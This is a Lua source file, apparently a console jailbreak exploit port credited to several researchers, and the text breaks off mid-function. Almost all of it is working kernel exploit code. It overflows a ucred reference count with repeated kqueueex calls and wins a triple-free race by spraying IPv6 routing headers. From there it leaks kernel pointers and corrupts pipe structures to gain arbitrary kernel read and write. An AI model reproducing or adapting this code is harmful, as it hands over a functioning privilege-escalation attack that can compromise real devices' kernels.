-- Credits to TheFloW, cheburek3000, egycnq, Gezine and guys behind lapse port for remote_lua_loader
-- there is like mix of 3 things, netcontrol impl by Fl0w, p2jb by cheburek3000 (technically it's egycnq's poops luac0re port) and lapse by rll guys
-- thanks to ufm42 for kexp
-- so it's more of a port rather than sole impl, and defenitely not a source someone should learn from :(

-- copied straight from lapse.lua
-- sys/socket.h
AF_UNIX = 1
AF_INET6 = 28
SOCK_STREAM = 1
SOL_SOCKET = 0xffff

-- netinet/in.h
IPPROTO_IPV6 = 41

-- netinet6/in6.h
IPV6_RTHDR = 51

syscall.resolve({
    read = 0x3, write = 0x4, close = 0x6, dup = 0x29, pipe = 0x2a,
    setuid = 0x17, netcontrol = 0x63, sched_yield = 0x14B,
    recvmsg = 0x1B, cpuset_getaffinity = 0x1E7, cpuset_setaffinity = 0x1E8, rtprio_thread = 0x1D2,
    sendto = 0x85, fcntl = 0x5C, kqueue = 0x16A,
    readv = 0x78, writev = 0x79, getpid = 0x14, nmount = 0x17A,
    ioctl = 0x36, umtx_op = 0x1C6,
    socket = 0x61, setsockopt = 0x69, getsockopt = 0x76,
    socketpair = 0x87, nanosleep = 0xF0,
    thr_exit = 0x1AF, thr_new = 0x1C7,
    kqueueex = 0x8D, jitshm_create = 0x215, jitshm_alias = 0x216
})

--
-- primitive thread class
--
-- use thr_new to spawn new thread
--
-- only bare syscalls are supported. any attempt to call into few libc
-- fns (such as printf/puts) will result in a crash
--

prim_thread = {}
prim_thread.__index = prim_thread

function prim_thread.init()

    local setjmp = fcall(libc_addrofs.setjmp)
    local jmpbuf = memory.alloc(0x60)

    -- get existing regs state
    setjmp(jmpbuf)

    prim_thread.fpu_ctrl_value = memory.read_dword(jmpbuf + 0x40)
    prim_thread.mxcsr_value = memory.read_dword(jmpbuf + 0x44)

    prim_thread.initialized = true
end

function prim_thread:prepare_structure()

    local jmpbuf = memory.alloc(0x60)

    -- skeleton jmpbuf
    memory.write_qword(jmpbuf, gadgets["ret"]) -- ret addr
    memory.write_qword(jmpbuf + 0x10, self.chain.stack_base) -- rsp - pivot to ropchain
    memory.write_dword(jmpbuf + 0x40, prim_thread.fpu_ctrl_value) -- fpu control word
    memory.write_dword(jmpbuf + 0x44, prim_thread.mxcsr_value) -- mxcsr

    -- prep structure for thr_new

    local stack_size = 0x400
    local tls_size = 0x40

    self.thr_new_args = memory.alloc(0x80)
    self.tid_addr = memory.alloc(0x8)

    local cpid = memory.alloc(0x8)
    local stack = memory.alloc(stack_size)
    local tls = memory.alloc(tls_size)

    memory.write_qword(self.thr_new_args, libc_addrofs.longjmp) -- fn
    memory.write_qword(self.thr_new_args + 0x8, jmpbuf) -- arg
    memory.write_qword(self.thr_new_args + 0x10, stack)
    memory.write_qword(self.thr_new_args + 0x18, stack_size)
    memory.write_qword(self.thr_new_args + 0x20, tls)
    memory.write_qword(self.thr_new_args + 0x28, tls_size)
    memory.write_qword(self.thr_new_args + 0x30, self.tid_addr) -- child pid
    memory.write_qword(self.thr_new_args + 0x38, cpid) -- parent tid

    self.ready = true
end


function prim_thread:new(chain)

    if not prim_thread.initialized then
        prim_thread.init()
    end

    if not chain.stack_base then
        error("`chain` argument must be a ropchain() object")
    end

    -- exit ropchain once finished
    chain:push_syscall(syscall.thr_exit, 0)

    local self = setmetatable({}, prim_thread)

    self.chain = chain

    return self
end

-- run ropchain in primitive thread
function prim_thread:run()

    if not self.ready then
        self:prepare_structure()
    end

    -- spawn new thread
    if syscall.thr_new(self.thr_new_args, 0x68):tonumber() == -1 then
        error("thr_new() error: " .. get_error_string())
    end

    self.ready = false
    self.tid = memory.read_qword(self.tid_addr):tonumber()

    return self.tid
end

-- core pinning and rtprio taken from lapse.lua
function rop_pin_to_core(chain, core)
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    memory.write_word(mask, bit32.lshift(1, core))
    chain:push_syscall(syscall.cpuset_setaffinity, level, which, id, setsize, mask)
end

function rop_set_rtprio(chain, prio)
    local PRI_REALTIME = 2
    local rtprio = memory.alloc(0x4)
    memory.write_word(rtprio, PRI_REALTIME)
    memory.write_word(rtprio + 0x2, prio)
    chain:push_syscall(syscall.rtprio_thread, 1, 0, rtprio)
end

function pin_to_core(core)
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    memory.write_word(mask, bit32.lshift(1, core))
    return syscall.cpuset_setaffinity(level, which, id, setsize, mask)
end

function get_core_index(mask_addr)
    local num = memory.read_dword(mask_addr):tonumber()
    local position = 0
    while num > 0 do
        num = bit32.rshift(num, 1)
        position = position + 1
    end
    return position - 1
end

function get_current_core()
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    syscall.cpuset_getaffinity(level, which, id, 0x10, mask)
    return get_core_index(mask)
end

local function p2jb()
    local IPV6_SOCK_NUM = 64
    local IOV_THREAD_NUM = 4
    local UIO_THREAD_NUM = 4
    local MAIN_CORE = 11
    local UIO_IOV_NUM = 0x14
    local MSG_IOV_NUM = 0x17
    local IOV_SIZE = 0x10
    local RTHDR_TAG = 0x13370000
    local UCRED_SIZE = 0x168
    local MAX_ROUNDS_TWIN = 10
    local MAX_ROUNDS_TRIPLET = 500
    local TRIPLEFREE_ATTEMPTS = 8
    local DEBUG_RUN_WAIT_FOR_BUMP_FROM_ELF = false -- change this if you want to bump the ucred ref count by hand, it will wait for you for 20 seconds
    local FREE_FDS_NUM = 0x13
    local KQUEUE_EX_AMNT = 0x100000001 - FREE_FDS_NUM + 0x3
    local UIO_SYSSPACE = 1
    local FIND_TRIPLET_FAST = 5000

    send_ps_notification("p2jb - 1.0")

    local ORIG_MAIN_CORE = get_current_core()
    pin_to_core(MAIN_CORE)

    local triplets = { -1, -1, -1 }

    local msg_iov = memory.alloc(MSG_IOV_NUM * IOV_SIZE)
    for i = 0, MSG_IOV_NUM * 16 - 1, 8 do memory.write_qword(msg_iov + i, 0) end
    memory.write_qword(msg_iov, 1); memory.write_qword(msg_iov + 8, 1)

    local msg = memory.alloc(0x30)
    for i = 0, 0x30, 8 do memory.write_qword(msg + i, 0) end
    memory.write_qword(msg + 0x10, msg_iov)
    memory.write_qword(msg + 0x18, MSG_IOV_NUM)

    local uio_iov_read = memory.alloc(UIO_IOV_NUM * IOV_SIZE)
    local uio_iov_write = memory.alloc(UIO_IOV_NUM * IOV_SIZE)

    local tmp = memory.alloc(0x4000)

    local leak_buffers = {}
    for i = 1, UIO_THREAD_NUM do
        leak_buffers[i] = memory.alloc(0x40)
    end

    local uio_read_buf = memory.alloc(64)
    for i = 0, 56, 8 do
        memory.write_dword(uio_read_buf + i, 0x41414141)
        memory.write_dword(uio_read_buf + i + 4, 0x41414141)
    end

    local uio_write_buf = memory.alloc(64)
    for i = 0, 56, 8 do memory.write_qword(uio_write_buf + i, 0) end

    memory.write_qword(uio_iov_read, uio_read_buf)
    memory.write_qword(uio_iov_write, uio_write_buf)

    local kread_sndbuf = memory.alloc(4)
    local kwrite_sndbuf = memory.alloc(4)

    local uio_ss = memory.alloc(8)
    syscall.socketpair(AF_UNIX, SOCK_STREAM, 0, uio_ss)
    local uio_ss0 = memory.read_dword(uio_ss + 0x00):tonumber()
    local uio_ss1 = memory.read_dword(uio_ss + 0x04):tonumber()

    local iov_ss = memory.alloc(8)
    syscall.socketpair(AF_UNIX, SOCK_STREAM, 0, iov_ss)
    local iov_ss0 = memory.read_dword(iov_ss + 0x00):tonumber()
    local iov_ss1 = memory.read_dword(iov_ss + 0x04):tonumber()

    -- all worker code is based on Luac0re's
    local function create_worker_sync(count)
        local raw = memory.alloc(8 + count * 8 + 128)
        local aligned = align_to(raw, 64)
        memory.write_qword(aligned, 0)
        for i = 0, count - 1 do memory.write_qword(aligned + 0x08 + i * 8, 0) end
        return { cmd = aligned, finished = aligned + 0x08, total = count, gen = 0 }
    end

    local function signal_workers(ws)
        for i = 0, ws.total - 1 do memory.write_qword(ws.finished + i * 8, 0) end
        ws.gen = ws.gen + 1
        memory.write_qword(ws.cmd, ws.gen)
        syscall.umtx_op(ws.cmd, 3, 0x7FFFFFFF, 0, 0)
    end

    local function wait_workers(ws)
        while true do
            local done = true
            for i = 0, ws.total - 1 do
                if memory.read_qword(ws.finished + i * 8):tonumber() == 0 then done = false; break end
            end
            if done then return end
            syscall.sched_yield()
        end
    end

    local function spawn_rop_worker(ws, wid, fd, iov_ptr, syscall_obj)
        local wait_value = memory.alloc(0x8)
        memory.write_qword(wait_value, 0)

        local chain = ropchain({
            stack_size = 0x8000,
            fcall_stub_padding_size = 0x2000,
        })

        rop_pin_to_core(chain, MAIN_CORE)
        rop_set_rtprio(chain, 0x100)

        local loop_rsp = chain:get_rsp()

        chain:push_syscall_raw(syscall.umtx_op, function()
            chain:push_set_r8(0)
            chain:push_set_rcx(0)
            chain:push_set_reg_from_memory("rdx", wait_value)
            chain:push_set_rsi(2)
            chain:push_set_rdi(ws.cmd)
        end)

        chain:push_set_rax_from_memory(ws.cmd)
        chain:push_store_rax_into_memory(wait_value)

        local iov_count = syscall_obj == syscall.recvmsg and 0 or UIO_IOV_NUM
        chain:push_syscall(syscall_obj, fd, iov_ptr, iov_count)

        chain:push_write_qword_memory(ws.finished + wid * 8, 1)
        chain:push_syscall(syscall.umtx_op, ws.finished + wid * 8, 3, 0x7FFFFFFF, 0, 0)
        chain:push_set_rsp(loop_rsp)

        local thr = prim_thread:new(chain)
        local tid = thr:run()
        printf("worker spawned with tid %x", tid)
        return thr
    end

    local iov_workers       = create_worker_sync(IOV_THREAD_NUM)
    local uio_read_workers  = create_worker_sync(UIO_THREAD_NUM)
    local uio_write_workers = create_worker_sync(UIO_THREAD_NUM)

    for i = 1, IOV_THREAD_NUM do
        spawn_rop_worker(iov_workers, i - 1,
            iov_ss0, msg, syscall.recvmsg)
    end
    for i = 1, UIO_THREAD_NUM do
        spawn_rop_worker(uio_read_workers, i - 1,
            uio_ss1, uio_iov_read, syscall.writev)
    end
    for i = 1, UIO_THREAD_NUM do
        spawn_rop_worker(uio_write_workers, i - 1,
            uio_ss0, uio_iov_write, syscall.readv)
    end

    local active_uio_mode = 0

    local function signal_iov()  signal_workers(iov_workers) end
    local function wait_iov()    wait_workers(iov_workers) end

    local function signal_uio(mode)
        active_uio_mode = mode
        if mode == 0 then signal_workers(uio_read_workers) else signal_workers(uio_write_workers) end
    end

    local function wait_uio()
        if active_uio_mode == 0 then wait_workers(uio_read_workers) else wait_workers(uio_write_workers) end
    end

    local function new_socket()
        local sd = syscall.socket(AF_INET6, SOCK_STREAM, 0):tonumber()
        if sd == -1 then
            error("new_socket() error: " .. get_error_string())
        end
        return sd
    end

    local ipv6_socks = {}

    for i = 1, IPV6_SOCK_NUM do ipv6_socks[i] = new_socket(); end

    local function build_rthdr(buf, target_size)
        local segments = bit32.band(bit32.rshift(target_size, 3) - 1, 0xFFFFFFFE)
        memory.write_byte(buf + 0x00, 0)
        memory.write_byte(buf + 0x01, segments)
        memory.write_byte(buf + 0x02, 0)
        memory.write_byte(buf + 0x03, bit32.rshift(segments, 1))
        return bit32.lshift(segments + 1, 3)
    end

    local spray_rthdr = memory.alloc(UCRED_SIZE)
    local spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE)
    local leak_rthdr = memory.alloc(UCRED_SIZE)
    local leak_rthdr_len = memory.alloc(4)

    local function get_rthdr(s, buf, len)
        return syscall.getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len):tonumber()
    end

    local function set_rthdr(s, buf, len)
        return syscall.setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len):tonumber()
    end

    local function free_rthdr(s)
        return syscall.setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, 0, 0):tonumber()
    end

    -- taken from luac0re's poops
    local function find_twins(max_rounds)
        for round = 1, max_rounds do
            for i = 0, IPV6_SOCK_NUM - 1 do
                memory.write_dword(spray_rthdr + 0x04, RTHDR_TAG + i)
                set_rthdr(ipv6_socks[i + 1], spray_rthdr, spray_rthdr_len)
            end
            for i = 0, IPV6_SOCK_NUM - 1 do
                memory.write_dword(leak_rthdr_len, 8)
                if get_rthdr(ipv6_socks[i + 1], leak_rthdr, leak_rthdr_len) >= 0 then
                    local val = memory.read_dword(leak_rthdr + 0x04):tonumber()
                    local j = bit32.band(val, 0xFFFF)
                    if bit32.band(val, 0xFFFF0000) == RTHDR_TAG and i ~= j and j < IPV6_SOCK_NUM then
                        return { i, j }
                    end
                end
            end
            if round % 50 == 0 then syscall.sched_yield() end
        end
        return nil
    end

    local function find_triplet(master_idx, exclude_idx, max_rounds)
        for round = 1, max_rounds do
            for i = 0, IPV6_SOCK_NUM - 1 do
                if i ~= master_idx and i ~= exclude_idx then
                    memory.write_dword(spray_rthdr + 0x04, RTHDR_TAG + i)
                    set_rthdr(ipv6_socks[i + 1], spray_rthdr, spray_rthdr_len)
                end
            end
            memory.write_dword(leak_rthdr_len, 8)
            if get_rthdr(ipv6_socks[master_idx + 1], leak_rthdr, leak_rthdr_len) >= 0 then
                local val = memory.read_dword(leak_rthdr + 0x04):tonumber()
                local j = bit32.band(val, 0xFFFF)
                if bit32.band(val, 0xFFFF0000) == RTHDR_TAG and j ~= master_idx and j ~= exclude_idx and j < IPV6_SOCK_NUM then
                    return j
                end
            end
            if round % 100 == 0 then syscall.sched_yield() end
        end
        return -1
    end

    local function prep_kqueuex_calling(core, cnt_buf, amnt)
        local chain = ropchain()

        rop_pin_to_core(chain, core)
        rop_set_rtprio(chain, 0x100)

        chain:gen_loop(cnt_buf, "<", amnt, function()
            chain:push_syscall(syscall.kqueueex, 0x800000000000)
            chain:push_increment_atomic_qword(cnt_buf)
        end)

        return chain
    end

    -- Stage 0: Triple-free race
    send_ps_notification("Stage patience\nOverflow ucred cr_ref")
    local free_fds = {}
    local free_fd_idx = 1

    local function prepare_fds()

        -- add for more cores
        local OVERFLOW_CORES = { 0, 1, 2 }

        local thrs_cnt = memory.alloc(8)

        local overflow_threads = {}
        if not DEBUG_RUN_WAIT_FOR_BUMP_FROM_ELF then
            for i = 1, #OVERFLOW_CORES do
                local chain = prep_kqueuex_calling(OVERFLOW_CORES[i], thrs_cnt, KQUEUE_EX_AMNT)
                overflow_threads[i] = prim_thread:new(chain)
            end
        end

        syscall.setuid(1)

        if not DEBUG_RUN_WAIT_FOR_BUMP_FROM_ELF then
            sleep(10)

            local tids = {}
            for i = 1, #OVERFLOW_CORES do
                tids[i] = string.format("%x", overflow_threads[i]:run())
            end

            printf("overflow_chain tids: %s", table.concat(tids, ", "))

            local cur_num = memory.read_qword(thrs_cnt):tonumber()

            local start_time = os.time()

            while cur_num < KQUEUE_EX_AMNT do
                sleep(60)
                cur_num = memory.read_qword(thrs_cnt):tonumber()

                local elapsed = os.time() - start_time

                local rate = 0
                if elapsed > 0 then rate = cur_num / elapsed end

                local eta_secs = 0
                if rate > 0 then eta_secs = math.floor((KQUEUE_EX_AMNT - cur_num) / rate) end

                local eh = math.floor(elapsed / 3600)
                local em = math.floor((elapsed % 3600) / 60)
                local es = math.floor(elapsed % 60)

                local rh = math.floor(eta_secs / 3600)
                local rm = math.floor((eta_secs % 3600) / 60)
                local rs = math.floor(eta_secs % 60)

                printf("overflow: %x / %x [elapsed %i:%02i:%02i, eta %i:%02i:%02i]",
                    cur_num, KQUEUE_EX_AMNT, eh, em, es, rh, rm, rs)
            end

            local elapsed = os.time() - start_time

            local hours = math.floor(elapsed / 3600)
            local minutes = math.floor((elapsed % 3600) / 60)
            local seconds = math.floor(elapsed % 60)

            local finish_msg = string.format("Took: %i:%02i:%02i", hours, minutes, seconds)

            printf(finish_msg)
            send_ps_notification(finish_msg)
        else
            printf("waiting for a 20 seconds, for you to send the elf that bumps the cr_ref of the gooner process")
            sleep(20)
        end

        -- Use fopen to get the rest of the cr_ref increment
        for i = 1, FREE_FDS_NUM do
            free_fds[i] = syscall.open("/dev/null")
        end

        -- Replace ucred, freeing all extra references from old ucred
        syscall.setuid(1)
        -- Allow new ucred to settle where it needs to settle
        sleep(10)
    end

    local function free_one_fd()
        syscall.close(free_fds[free_fd_idx])
        free_fd_idx = free_fd_idx + 1
    end

    prepare_fds()

    local race_success = false

    -- heavily based on Fl0w's poops
    local function attempt_race()
        for i = 1, IPV6_SOCK_NUM do free_rthdr(ipv6_socks[i]); end

        free_one_fd()
        for i = 1, 32 do
            signal_iov()
            syscall.write(iov_ss1, tmp, 1)
            wait_iov()
            syscall.read(iov_ss0, tmp, 1)
        end

        free_one_fd()

        local twins = find_twins(MAX_ROUNDS_TWIN)

        if not twins then
            print("no twins")
            return false
        end

        free_rthdr(ipv6_socks[twins[2] + 1])

        local reclaimed = false
        for _ = 1, MAX_ROUNDS_TRIPLET do
            -- Reclaim with iov.
            signal_iov()
            syscall.sched_yield();

            memory.write_dword(leak_rthdr_len + 0x00, 8)
            get_rthdr(ipv6_socks[twins[1] + 1], leak_rthdr, leak_rthdr_len)

            if memory.read_dword(leak_rthdr + 0x00):tonumber() == 1 then
                reclaimed = true
                break
            end

            -- Release iov spray.
            syscall.write(iov_ss1, tmp, 1)
            wait_iov()
            syscall.read(iov_ss0, tmp, 1)
        end

        if not reclaimed then
            print("not reclaimed")
            return false
        end

        triplets[1] = twins[1];

        free_one_fd()

        triplets[2] = find_triplet(triplets[1], -1, MAX_ROUNDS_TRIPLET);
        if triplets[2] == -1 then
            print("failed to find triplets")
            return false
        end

        syscall.write(iov_ss1, tmp, 1);

        triplets[3] = find_triplet(triplets[1], triplets[2], MAX_ROUNDS_TRIPLET);
        if triplets[3] == -1 then
            print("failed to find triplets")
            return false
        end

        wait_iov()
        syscall.read(iov_ss0, tmp, 1);
        return true
    end

    for attempt = 1, TRIPLEFREE_ATTEMPTS do
        if attempt_race() then
            race_success = true
            printf("triplets fds %i, %i, %i", triplets[1], triplets[2], triplets[3])
            break
        end
        sleep(10, "ms")
    end

    if not race_success then
       send_ps_notification("we fucked up, we cancel, you turn off the console!")
       error("we fucked up, we cancel, you turn off the console!")
    end

    local kq_fdp = 0

    -- heavily based on Fl0w's poops
    local function leak_kqueue()
        print("Leaking kqueue...");

        free_rthdr(ipv6_socks[triplets[2] + 1]);

        local kq = 0
        while true do
            kq = syscall.kqueue():tonumber()

            memory.write_dword(leak_rthdr_len, 0x100)
            get_rthdr(ipv6_socks[triplets[1] + 1], leak_rthdr, leak_rthdr_len)

            if memory.read_qword(leak_rthdr + 0x08):tonumber() == 0x1430000 then
                break
            end

            syscall.close(kq)
        end

        kq_fdp = memory.read_qword(leak_rthdr + 0xA8):tonumber()
        printf("kq_fdp: %x", kq_fdp)

        syscall.close(kq)

        triplets[2] = find_triplet(triplets[1], triplets[3], 50000)
    end

    leak_kqueue()

    local function triplets_valid()
        return triplets[1] >= 0 and triplets[2] >= 0 and triplets[3] >= 0
            and triplets[2] < IPV6_SOCK_NUM and triplets[3] < IPV6_SOCK_NUM
    end

    local function repair_triplets()
        if triplets[2] < 0 or triplets[2] >= IPV6_SOCK_NUM then
            for attempt = 1, 5 do
                triplets[2] = find_triplet(triplets[1], triplets[3], 5000)
                if triplets[2] ~= -1 then break end
                syscall.sched_yield(); sleep(10, "ms")
            end
        end
        if triplets[3] < 0 or triplets[3] >= IPV6_SOCK_NUM then
            for attempt = 1, 5 do
                triplets[3] = find_triplet(triplets[1], triplets[2], 5000)
                if triplets[3] ~= -1 then break end
                syscall.sched_yield(); sleep(10, "ms")
            end
        end
        return triplets_valid()
    end

    local function build_uio(buf, iov_ptr, td, is_read, kaddr, size)
        memory.write_qword(buf + 0x0, iov_ptr)
        memory.write_qword(buf + 0x8, UIO_IOV_NUM)
        memory.write_dword(buf + 0x10, 0xFFFFFFFF)
        memory.write_dword(buf + 0x14, 0xFFFFFFFF)
        memory.write_qword(buf + 0x18, size)
        memory.write_dword(buf + 0x20, UIO_SYSSPACE)
        memory.write_dword(buf + 0x24, is_read and 1 or 0)
        memory.write_qword(buf + 0x28, td)
        memory.write_qword(buf + 0x30, kaddr)
        memory.write_qword(buf + 0x38, size)
    end


    -- heavily based on Luac0re's
    local function kread_slow(kaddr, size)
        if not triplets_valid() then return nil end
        for i = 0, 56, 8 do
            memory.write_dword(uio_read_buf + i, 0x41414141)
            memory.write_dword(uio_read_buf + i + 4, 0x41414141)
        end
        for i = 1, UIO_THREAD_NUM do
            for j = 0, size - 1 do memory.write_byte(leak_buffers[i] + j, 0) end
        end

        memory.write_dword(kread_sndbuf, size)
        syscall.setsockopt(uio_ss1, SOL_SOCKET, 0x1001, kread_sndbuf, 4)
        syscall.write(uio_ss1, tmp, size)
        memory.write_qword(uio_iov_read + 8, size)

        if not triplets_valid() then return nil end
        free_rthdr(ipv6_socks[triplets[2] + 1])

        syscall.sched_yield()

        local uio_iters = 0
        while true do

            signal_uio(0)
            syscall.sched_yield()

            memory.write_dword(leak_rthdr_len, 16)

            get_rthdr(ipv6_socks[triplets[1] + 1], leak_rthdr, leak_rthdr_len)

            if memory.read_dword(leak_rthdr + 8):tonumber() == UIO_IOV_NUM then break end


            syscall.read(uio_ss0, tmp, size)
            for i = 1, UIO_THREAD_NUM do syscall.read(uio_ss0, leak_buffers[i], size) end

            wait_uio()
            syscall.write(uio_ss1, tmp, size)
            uio_iters = uio_iters + 1

            if uio_iters > 2000 then return nil end
        end

        local leaked_iov_obj = memory.read_qword(leak_rthdr)
        local leaked_iov_lo  = memory.read_dword(leak_rthdr):tonumber()
        local leaked_iov_hi  = memory.read_dword(leak_rthdr + 4):tonumber()

        if (leaked_iov_lo == 0 and leaked_iov_hi == 0) or bit32.rshift(leaked_iov_hi, 16) ~= 0xFFFF then
            return nil
        end

        build_uio(msg_iov, leaked_iov_obj, 0, true, kaddr, size)

        if not triplets_valid() then return nil end
        free_rthdr(ipv6_socks[triplets[3] + 1])

        syscall.sched_yield()

        local iov_iters = 0
        while true do

            signal_iov()
            syscall.sched_yield()

            memory.write_dword(leak_rthdr_len, 64)
            get_rthdr(ipv6_socks[triplets[1] + 1], leak_rthdr, leak_rthdr_len)


            if memory.read_dword(leak_rthdr + 32):tonumber() == UIO_SYSSPACE then break end

            syscall.write(iov_ss1, tmp, 1)
            wait_iov()
            syscall.read(iov_ss0, tmp, 1)
            iov_iters = iov_iters + 1
            if iov_iters > 2000 then return nil end
        end

        syscall.read(uio_ss0, tmp, size)
        local result = nil
        for i = 1, UIO_THREAD_NUM do
            syscall.read(uio_ss0, leak_buffers[i], size)

            if memory.read_dword(leak_buffers[i]):tonumber() ~= 0x41414141 or memory.read_dword(leak_buffers[i] + 4):tonumber() ~= 0x41414141 then
                local t = find_triplet(triplets[1], -1, FIND_TRIPLET_FAST)
                if t == -1 then
                    wait_uio()
                    syscall.write(iov_ss1, tmp, 1)
                    wait_iov()
                    syscall.read(iov_ss0, tmp, 1)
                    triplets[2] = find_triplet(triplets[1], triplets[3], FIND_TRIPLET_FAST)
                    return nil
                end
                triplets[2] = t
                result = leak_buffers[i]
            end
        end
        wait_uio()
        syscall.write(iov_ss1, tmp, 1)

        if not result then
            wait_iov(); syscall.read(iov_ss0, tmp, 1)
            return nil
        end

        for attempt = 1, 5 do
            triplets[3] = find_triplet(triplets[1], triplets[2], FIND_TRIPLET_FAST)
            if triplets[3] ~= -1 then break end
            syscall.sched_yield()
        end

        if triplets[3] == -1 then
            wait_iov(); syscall.read(iov_ss0, tmp, 1)
            return nil
        end

        wait_iov(); syscall.read(iov_ss0, tmp, 1)
        return result
    end

    local function kwrite_slow(kaddr, data, data_size)
        if not triplets_valid() then return false end

        memory.write_dword(kwrite_sndbuf, data_size)
        syscall.setsockopt(uio_ss1, SOL_SOCKET, 0x1001, kwrite_sndbuf, 4)
        memory.write_qword(uio_iov_write + 8, data_size)

        if not triplets_valid() then return false end
        free_rthdr(ipv6_socks[triplets[2] + 1])

        syscall.sched_yield()

        local uio_iters = 0
        while true do

            signal_uio(1)
            syscall.sched_yield()

            memory.write_dword(leak_rthdr_len, 16)
            get_rthdr(ipv6_socks[triplets[1] + 1], leak_rthdr, leak_rthdr_len)

            if memory.read_dword(leak_rthdr + 8):tonumber() == UIO_IOV_NUM then break end

            for i = 1, UIO_THREAD_NUM do syscall.write(uio_ss1, data, data_size) end
            wait_uio()
            uio_iters = uio_iters + 1
            if uio_iters > 2000 then return false end
        end

        local leaked_iov_obj = memory.read_qword(leak_rthdr)
        local leaked_iov_lo  = memory.read_dword(leak_rthdr):tonumber()
        local leaked_iov_hi  = memory.read_dword(leak_rthdr + 4):tonumber()

        if (leaked_iov_lo == 0 and leaked_iov_hi == 0) or bit32.rshift(leaked_iov_hi, 16) ~= 0xFFFF then
            return false
        end

        build_uio(msg_iov, leaked_iov_obj, 0, false, kaddr, data_size)

        if not triplets_valid() then return false end
        free_rthdr(ipv6_socks[triplets[3] + 1])

        syscall.sched_yield()
        local iov_iters = 0

        while true do

            signal_iov()
            syscall.sched_yield()

            memory.write_dword(leak_rthdr_len, 64)
            get_rthdr(ipv6_socks[triplets[1] + 1], leak_rthdr, leak_rthdr_len)

            if memory.read_dword(leak_rthdr + 32):tonumber() == UIO_SYSSPACE then break end

            syscall.write(iov_ss1, tmp, 1)
            wait_iov()
            syscall.read(iov_ss0, tmp, 1)
            iov_iters = iov_iters + 1
            if iov_iters > 2000 then return false end
        end

        for i = 1, UIO_THREAD_NUM do syscall.write(uio_ss1, data, data_size) end

        for attempt = 1, 5 do
            triplets[2] = find_triplet(triplets[1], -1, FIND_TRIPLET_FAST)
            if triplets[2] ~= -1 then break end
            syscall.sched_yield()
        end
        if triplets[2] == -1 then return false end

        wait_uio()
        syscall.write(iov_ss1, tmp, 1)

        for attempt = 1, 5 do
            triplets[3] = find_triplet(triplets[1], triplets[2], FIND_TRIPLET_FAST)
            if triplets[3] ~= -1 then break end
            syscall.sched_yield()
        end
        if triplets[3] == -1 then return false end
        wait_iov(); syscall.read(iov_ss0, tmp, 1)
        return true
    end

    local function safe_kread64(kaddr)
        for attempt = 1, 5 do
            if triplets_valid() then
                local buf = kread_slow(kaddr, 8)
                if buf then
                    return memory.read_qword(buf)
                end
            end
            repair_triplets(); syscall.sched_yield()
        end
        return nil
    end

    local fd_files = safe_kread64(kq_fdp)
    repair_triplets()

    if not fd_files then
        send_ps_notification("Failed to read kq_fdp no point in going further")
        error("Failed to read kq_fdp no point in going further")
    end

    -- pipe pairs for kernel r/w primitive

    local master_rfd, master_wfd = create_pipe()
    local victim_rfd, victim_wfd = create_pipe()
    syscall.fcntl(master_rfd, 4, 4); syscall.fcntl(master_wfd, 4, 4)
    syscall.fcntl(victim_rfd, 4, 4); syscall.fcntl(victim_wfd, 4, 4)
    printf("m_rfd: %i, m_wfd: %i, v_rfd: %i, v_wfd: %i", master_rfd, master_wfd, victim_rfd, victim_wfd);

    local fd_ofiles = fd_files + 0x08;
    printf("fd_ofiles: %x", fd_ofiles:tonumber())

    local master_fp, victim_fp
    local master_pipe_data, victim_pipe_data

    master_fp = safe_kread64(fd_ofiles + master_rfd * 0x30) -- fdescenttbl.fdt_ofiles[master_rfd] I think
    repair_triplets()
    victim_fp = safe_kread64(fd_ofiles + victim_rfd * 0x30)
    repair_triplets()
    printf("master_fp: %x, victim_fp: %x", master_fp:tonumber(), victim_fp:tonumber())

    master_pipe_data = safe_kread64(master_fp)
    repair_triplets()
    victim_pipe_data = safe_kread64(victim_fp)
    repair_triplets()
    printf("master_pipe_data: %x, victim_pipe_data: %x", master_pipe_data:tonumber(), victim_pipe_data:tonumber())


    -- [Also Luac0re taken] Pipe corruption -> fast kernel r/w
    local pipe_overwrite = memory.alloc(24)
    memory.write_dword(pipe_overwrite,      0)              -- cnt
    memory.write_dword(pipe_overwrite + 4,  0)              -- in
    memory.write_dword(pipe_overwrite + 8,  0)              -- out
    memory.write_dword(pipe_overwrite + 12, PAGE_SIZE)      -- size
    memory.write_qword(pipe_overwrite + 16, victim_pipe_data)  -- buffer -> victim pipe

    sleep(100, "ms")

    local corrupt_ok = false
    for attempt = 1, 3 do
        if kwrite_slow(master_pipe_data, pipe_overwrite, 24) then corrupt_ok = true; break end
        sleep(100, "ms"); syscall.sched_yield()
    end
    if not corrupt_ok then print("kwrite_slow failed"); return end

    -- pipe-based fast kernel r/w primitives
    local pipe_cmd_buf = memory.alloc(24)

    local function set_victim_pipe(cnt, inp, out, size, buf_addr)
        memory.write_dword(pipe_cmd_buf,      cnt)
        memory.write_dword(pipe_cmd_buf + 4,  inp)
        memory.write_dword(pipe_cmd_buf + 8,  out)
        memory.write_dword(pipe_cmd_buf + 12, size)
        memory.write_qword(pipe_cmd_buf + 16, buf_addr)
        syscall.write(master_wfd, pipe_cmd_buf, 24)
        return syscall.read(master_rfd, pipe_cmd_buf, 24)
    end

    local function kread(buf, kaddr, size)
        set_victim_pipe(size, 0, 0, PAGE_SIZE, kaddr)
        return syscall.read(victim_rfd, buf, size)
    end

    local function kwrite(kaddr, buf, size)
        set_victim_pipe(0, 0, 0, PAGE_SIZE, kaddr)
        return syscall.write(victim_wfd, buf, size)
    end

    for i = 0, 56, 8 do memory.write_qword(tmp + i, 0) end

    local function kread_helper(kaddr, len) kread(tmp, kaddr, len); return memory.read_buffer(tmp, len) end
    local function kwrite_helper(kaddr, buf) kwrite(kaddr, lua.resolve_value(buf), #buf) end

    ipv6_kernel_rw.read_buffer = kread_helper
    ipv6_kernel_rw.write_buffer = kwrite_helper
    kernel.read_buffer = kread_helper
    kernel.write_buffer = kwrite_helper

     -- verify corruption
    local verify_ok = false
    for attempt = 1, 3 do
        repair_triplets()
        if kernel.read_qword(master_pipe_data + 0x10) == victim_pipe_data then verify_ok = true; break end
        sleep(100, "ms")
